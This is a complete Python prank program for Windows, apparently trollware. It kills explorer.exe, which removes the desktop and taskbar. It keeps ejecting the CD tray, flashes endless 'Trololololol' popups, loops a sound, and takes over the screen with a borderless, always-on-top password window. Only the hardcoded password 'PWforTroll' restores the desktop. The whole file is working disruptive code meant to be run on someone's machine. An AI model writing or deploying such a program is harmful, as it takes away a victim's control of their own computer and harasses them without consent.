import time, os, ctypes, tkinter as tk, random, winsound
from threading import Thread


os.system("taskkill /f /im explorer.exe")


class ersteKlasse(Thread):
        def __init__(self):
            Thread.__init__(self)

        def run(self):
                time.sleep(5)
                while True:
                        ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
                        time.sleep(random.randint(5, 90))


class zweiteKlasse(Thread):
    def __init__(self):
        Thread.__init__(self)

    def run(self):
        zaehler = 0
        nenner = 20
        passwort = "PWforTroll"
        antwort = ""
        antwort1 = ""
        time.sleep(2)
        while True:
            class Example(tk.Frame):
                def __init__(self, parent):
                    tk.Frame.__init__(self, parent)
                    self.label = tk.Label(self, text="Trololololol",
                                          font =("Comic Sans MS", 80),
                                          background="red", foreground="yellow")
                    self.label.pack(side="top", fill="both", expand=True)
                    self.flash()

                def flash(self):
                    bg = self.label.cget("background")
                    fg = self.label.cget("foreground")
                    self.label.configure(background=fg, foreground=bg)
                    self.after(200, self.flash)
                    
            class Example1(tk.Frame):
                def __init__(self, parent):
                    tk.Frame.__init__(self, parent)
                    self.label = tk.Label(self, text="Trololololol",
                                          font =("Comic Sans MS", 80),
                                          background="blue", foreground="yellow")
                    self.label.pack(side="top", fill="both", expand=True)
                    self.secondflash()


                def secondflash(self):
                    bg = self.label.cget("background")
                    fg = self.label.cget("foreground")
                    self.label.configure(background=fg, foreground=bg)
                    self.after(200, self.secondflash)

            if __name__ == "__main__":
                if zaehler == nenner:
                    zaehler = 0
                    nenner += nenner
                    def senden(eingabewidget, labelwidget):
                        pwdinput = str(eingabewidget.get())
                        if pwdinput != passwort:  
                                ctypes.windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
                                root1.destroy()

                        if pwdinput == passwort:
                                time.sleep(1)
                                os.system("%systemroot%\sysnative\cmd.exe /c start /B explorer.exe")
                                os.system("taskkill /f /im pythonw.exe")



                    #GUI
                    root1 = tk.Tk()
                    root1.attributes("-topmost", True)
                    root1.attributes("-toolwindow",1)
                    root1.configure(bg="yellow")
                    root1.overrideredirect(True)
                    root1.geometry("{0}x{1}+0+0".format(root1.winfo_screenwidth(), root1.winfo_screenheight()))

                    #Überschrift
                    labelStart = tk.Label(root1, text="Passwort", bg="yellow", fg="red", width=200, font=("Comic Sans MS",200))
                    labelStart.pack()

                    #Antwort
                    labelAntwort = tk.Label(root1, text=antwort, width=200, bg="white", fg="black")

                    #Eingabe
                    eingabe = tk.Entry(root1, show="*", width=25, text=antwort1, font=("Comic Sans MS", 30), fg="red")
                    eingabe.pack()

                    button = tk.Button(root1,
                                            text = "eingabe",
                                            bg="red", fg="yellow",
                                            height=2, width=15,
                                            font=("Comic Sans MS", 20),
                                            command = lambda: senden(eingabe, labelAntwort))
                    button.pack()
                    root1.mainloop()
                zaehler += 1
                root = tk.Tk()
                x = random.randint(10, 1000)
                y = random.randint(100,500)           
                root.geometry('%dx%d+%d+%d' % (550, 150, x, y))
                root.title("Trololololo")
                root.attributes("-topmost", True)
                root.after(500, lambda: root.destroy())
                Example1(root).pack(fill="both", expand=True)
                root.mainloop()
                root = tk.Tk()
                x = random.randint(10, 1000)
                y = random.randint(100,500)           
                root.geometry('%dx%d+%d+%d' % (550, 150, x, y))
                root.title("Trololololo")
                root.attributes("-topmost", True)
                root.after(500, lambda: root.destroy())
                Example(root).pack()
                root.mainloop()


class dritteKlasse(Thread):
        def __init__(self):
                Thread.__init__(self)

        def run(self):
                while True:
                        winsound.PlaySound("troll.wav", winsound.SND_ASYNC | winsound.SND_ALIAS )
                        time.sleep(123)
                        
                
if __name__=='__main__':
        a=ersteKlasse()
        b=zweiteKlasse()
        c=dritteKlasse()

        a.start()
        b.start()
        c.start()
